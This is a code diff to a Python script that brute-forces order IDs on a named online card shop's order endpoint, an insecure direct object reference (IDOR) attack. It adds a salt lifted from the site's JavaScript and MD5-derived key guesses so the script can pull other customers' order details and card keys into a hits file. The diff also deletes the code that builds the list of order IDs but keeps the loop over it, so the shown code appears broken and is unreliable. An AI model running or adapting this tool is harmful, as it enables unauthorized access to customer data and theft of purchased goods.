@@ -16,17 +16,24 @@ BASE = "https://xinhe001.lol/shop/ajax.php?act=order"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
 DELAY = 8
 
+HASHSALT = "8d6673bb4bde73830ed11c898186a872"  # decoded from faka.js
+
 COMMON_PASSWORDS = [
     "", "1", "123456", "12345678", "888888", "666666", "password",
     "test", "test123", "abc123", "qwerty", "111111", "000000",
     "123123", "a123456", "1234567890", "admin", "root",
+    HASHSALT,
 ]
 
-# skey 候选: 取卡密码常见弱口令 + mysid 格式 (32hex)
-def gen_skeys(extra=None):
+def gen_skeys(extra=None, order_id=None):
+    import hashlib
     s = set(COMMON_PASSWORDS)
     if extra:
         s.update(extra)
+    if order_id is not None:
+        oid = str(order_id)
+        for a, b in [(oid, HASHSALT), (HASHSALT, oid), (oid, "xinhe001")]:
+            s.add(hashlib.md5((a + b).encode()).hexdigest())
     return list(s)
 
 
@@ -74,26 +81,16 @@ def main():
     ap.add_argument("-o", "--output", default="xinhe_idor_hits.json")
     args = ap.parse_args()
 
-    passwords = gen_skeys()
-    if args.passwords:
-        passwords = gen_skeys(args.passwords.split(","))
+    extra = args.passwords.split(",") if args.passwords else None
     if args.wordlist:
         with open(args.wordlist) as f:
-            passwords = list(set(passwords + [l.strip() for l in f if l.strip()]))
-
-    ids = []
-    if args.id:
-        ids = [args.id]
-    elif args.range:
-        ids = list(range(args.range[0], args.range[1] + 1))
-    else:
-        ap.print_help()
-        return
+            extra = (extra or []) + [l.strip() for l in f if l.strip()]
 
     hits = []
     for oid in ids:
-        print(f"[*] probing order id={oid} ({len(passwords)} passwords)", flush=True)
-        r = try_id(oid, passwords)
+        pw = gen_skeys(extra, order_id=oid)
+        print(f"[*] probing order id={oid} ({len(pw)} passwords)", flush=True)
+        r = try_id(oid, pw)
         if r["hit"]:
             print(f"[+] HIT id={oid} skey={r['skey']}", flush=True)
             if "kminfo" in r:
